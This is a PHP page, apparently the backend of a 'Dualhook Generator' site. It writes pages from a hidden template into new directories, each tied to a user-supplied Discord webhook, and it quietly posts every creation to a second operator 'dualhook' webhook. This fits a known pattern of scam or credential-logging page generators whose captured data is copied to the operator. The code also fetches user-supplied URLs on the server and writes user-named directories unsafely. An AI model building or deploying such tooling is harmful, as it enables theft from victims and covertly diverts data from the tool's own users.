<?php
error_reporting(0);

function crypto_rand_secure($min, $max)
{
    $range = $max - $min;
    if ($range < 1) return $min; // not so random...
    $log = ceil(log($range, 2));
    $bytes = (int) ($log / 8) + 1; // length in bytes
    $bits = (int) $log + 1; // length in bits
    $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
    do {
        $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        $rnd = $rnd & $filter; // discard irrelevant bits
    } while ($rnd > $range);
    return $min + $rnd;
}
function getToken($length)
{
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    $max = strlen($codeAlphabet); // edited

    for ($i=0; $i < $length; $i++) {
        $token .= $codeAlphabet[crypto_rand_secure(0, $max-1)];
    }

    return $token;
}
function randomshit($length) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345689';
    $my_string = '';
    for ($i = 0; $i < $length; $i++) {
      $pos = mt_rand(0, strlen($chars) -1);
      $my_string .= substr($chars, $pos, 1);
    }
    $shit= strtoupper($my_string);
    return "GEN-$shit";
  }
function getHost($Address) { 
    $parseUrl = parse_url(trim($Address)); 
    return trim($parseUrl['host'] ? $parseUrl['host'] : array_shift(explode('/', $parseUrl['path'], 2))); 
  }
//END
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
//
include("../../web/setup/setup.php");
include("../../web/setup/database.php");
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $captcha = $_POST['recaptcha-response'];

    $ip = $_SERVER["REMOTE_ADDR"];
    $response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$recaptcha_secretkey."&response=".$captcha."&remoteip=".$ip);
    $responseKeys = json_decode($response,true);
    if(intval($responseKeys["success"]) !== 1) {
        //notified
        $error = 'Please solve the captcha first!';
    } else {
if(isset($_POST["selectdir"]) || ($_POST["name"]) || ($_POST["thumbnails"]) || ($_POST["color"]) || ($_POST["webhook"]) ){
if(filter_var($_POST["webhook"], FILTER_VALIDATE_URL)) {
if(filter_var($_POST["thumbnails"], FILTER_VALIDATE_URL)) {
if (getHost($_POST["webhook"]) == "discord.com" || getHost($_POST["webhook"]) == "discordapp.com") {
$selectdir = htmlspecialchars($_POST["selectdir"]);
if($selectdir == "cust"){
    $dirtype = "cust";
}if($selectdir == "rand"){
    $dirtype = "rand";
}if($selectdir){
    if($dirtype == "rand"){
        $directory = randomshit(8);
    }if($dirtype == "cust"){
        $directory = htmlspecialchars($_POST["dir"]);
        $directory = str_replace("<?=", "%", $directory);
        $directory = str_replace("<?php", "%", $directory);
        $directory = str_replace("?>", "%", $directory);
        $directory = str_replace(".","dot", $directory);

    }
    $genname = htmlspecialchars($_POST["name"]);
    $thumbnails = htmlspecialchars($_POST["thumbnails"]);
    $embedcolor = htmlspecialchars($_POST["hexcolor"]);
    $webhook = htmlspecialchars($_POST["webhook"]);
    //
    $genname = str_replace("<?=", "", $genname);
    $genname = str_replace("?>", "", $genname);
    $genname = str_replace("<?php", "", $genname);
    //
    $thumbnails = str_replace("<?=", "", $thumbnails);
    $thumbnails = str_replace("?>", "", $thumbnails);
    $thumbnails = str_replace("<?php", "", $thumbnails);
    //
    $embedcolor = str_replace("<?=", "", $embedcolor);
    $embedcolor = str_replace("?>", "", $embedcolor);
    $embedcolor = str_replace("<?php", "", $embedcolor);
  	$embedcolor = str_replace("#","",$embedcolor);
    //
    $webhook = str_replace("<?=", "", $webhook);
    $webhook = str_replace("?>", "", $webhook);
    $webhook = str_replace("<?php", "", $webhook);
    //COOL BRUH
        /*validating the webhook existance */
        $webhook = htmlspecialchars($_POST['webhook']);
        $chkwebhook = file_get_contents($webhook);
        $chkwebhook1 = json_decode($chkwebhook);
    
        if ($chkwebhook1->message == "Unknown Webhook") {
        $error = "Please enter an valid webhook!";
        } elseif (empty($chkwebhook1->type)) {
        
        $error = "Please enter an valid webhook!";
        } else {
$token = getToken(69);
            $template = file_get_contents("templatesecretfoldernobodynowsabouthehe/urgayifurhereskid.php");
            $template = str_replace("{replaceabletoken}", $token, $template);
            mkdir("../../creates/$directory");
            file_put_contents("../../creates/$directory/index.php", $template);

            $PDOLog = $db -> prepare('INSERT INTO `eastdualhook` VALUES(:directory, :name, :imageurl, :hexcolor, :webhook, :token)');
            $PDOLog -> execute(array(':directory' => $directory, ':name' => $genname, ':imageurl' => $thumbnails, ':hexcolor' => $embedcolor, ':webhook' => $webhook, ':token' => $token));
            
            $timestamp = date("c", strtotime("now"));
$json_data = json_encode([
    "content" => null, 
    "embeds" => [
          [
             "title" => "$siteName On Top", 
             "description" => "```Dualhook Generator Url: $domain/creates/$directory```", 
             "url" => "$domain/controller", 
             "color" => hexdec("$embedColor"), 
             "author" => [
                "name" => "$siteName - Dualhook Generator", 
                "url" => "$domain/" 
             ], 
             "footer" => [
                   "text" => "$siteName", 
                   "icon_url" => "$mainpfp" 
                ], 
             "timestamp" => "$timestamp", 
             "thumbnail" => [
                      "url" => "$mainpfp" 
                   ] 
          ] 
       ], 
    "username" => "BOT - $siteName", 
    "avatar_url" => "$mainpfp", 
    "attachments" => [
                      ] 
    
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            
            
            $ch = curl_init( $webhook );
            curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt( $ch, CURLOPT_POST, 1);
            curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
            curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt( $ch, CURLOPT_HEADER, 0);
            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
            
            $exec = curl_exec( $ch );
            curl_close( $ch );
            
            $chs = curl_init( $dualhook );
            curl_setopt( $chs, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt( $chs, CURLOPT_POST, 1);
            curl_setopt( $chs, CURLOPT_POSTFIELDS, $json_data);
            curl_setopt( $chs, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt( $chs, CURLOPT_HEADER, 0);
            curl_setopt( $chs, CURLOPT_RETURNTRANSFER, 1);
            
            $execs = curl_exec( $chs );
            curl_close( $chs );
            $success = "true";
}
}
}else{
    $error = "Webhook isnt an discord URI!";
}
}else{
    $error = "Thumbnail must be an URI!";
}
}else{
    $error = "Webhook must be an URI!";
}
}
}
}
?>



<!doctype html>
<html lang="en">
  <head>
  	<title><?= $siteName; ?> - Generator</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" sizes="16x16" href="<?= $mainpfp; ?>">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="../css/style.css">
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
	</head>
	<body style="background: url('<?= $mainpfp; ?>') fixed no-repeat center;">
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-12 col-lg-6">
					<div class="login-wrap py-5">
		      	<h3 class="text-center mb-0"><?= $siteName; ?></h3>
		      	<p class="text-center"><?= $webText; ?> </p>
						<form class="login-form" method="POST">
						    					<div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <select name="selectdir" class="form-control" id="selectdir">
                          <option value="rand" style="color:#000;">Random Directory</option>
                          <option value="cust" style="color:#000;">Custom Directory</option>
                        </select>
	                </div>
	                <div class="form-group" id="customdir" style="display:none;">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="text" id="dir" name="dir" class="form-control" placeholder="Directory">
	                </div>
					<div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="text" id="name" name="name" class="form-control" placeholder="Name Your Generator" required>
	                </div>
	                <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="url" id="thumbnails" name="thumbnails" class="form-control" placeholder="Thumbnails" required>
	                </div>
	                <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="text" id="color" name="hexcolor" class="form-control" placeholder="Embed Color Hex" required>
	                </div>
	                <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span class="fa fa-cog"></span></div>
	                    <input type="url" id="webhook" name="webhook" class="form-control" placeholder="Webhook" required>
	                </div>
	                <input type="text" id="g-recaptcha-response" name="recaptcha-response" hidden>
	            <div class="form-group">
	                <input type="submit" name="submit" id="submit" class="btn form-control btn-primary rounded submit px-3" value="Create Now!" hidden>
	                <button class="g-recaptcha btn form-control btn-primary rounded submit px-3" 
        data-sitekey="<?= $recaptcha_sitekey; ?>" 
        data-callback='onSubmit' 
        data-action='submit'>Create Now!</button>
	            </div>
	          </form>
	        </div>
				</div>
			</div>
		</div>
	</section>
    <script>
                <?php
        if($error){
            echo "Swal.fire(
                      'Error',
                      '$error',
                      'error'
                    )
                ";
            }
                    ?>
        <?php
        if($success == "true"){
            echo "Swal.fire(
                'success',
                'Check your Discord For Link!',
                'success'
              )
          ";
        }
        ?>
        function onSubmit(token) {
            console.log(token);
            document.getElementById("g-recaptcha-response").value = token;
            generate();
        }
        
        setInterval(function() {
            var select = document.getElementById("selectdir").value;
            if(select == "rand"){
                document.getElementById("customdir").style.display = "none";
            }else{
                document.getElementById("customdir").style.display = "block";
            }
        });
        
        function generate(){
                var Webhook = document.getElementById("webhook").value;
                var Name = document.getElementById("name").value;
                var Thumbnails = document.getElementById("thumbnails").value;
                var Embed = document.getElementById("color").value;
                if(!Webhook || !Name || !Thumbnails || !Embed){
                    Swal.fire(
                      'Error',
                      'Input cannot be empty',
                      'error'
                    )
                }else{
                    document.getElementById("submit").click();
            }
        }
    </script>
	<script src="../js/jquery.min.js"></script>
  <script src="../js/popper.js"></script>
  <script src="../js/bootstrap.min.js"></script>
  <script src="../js/main.js"></script>

	</body>
</html>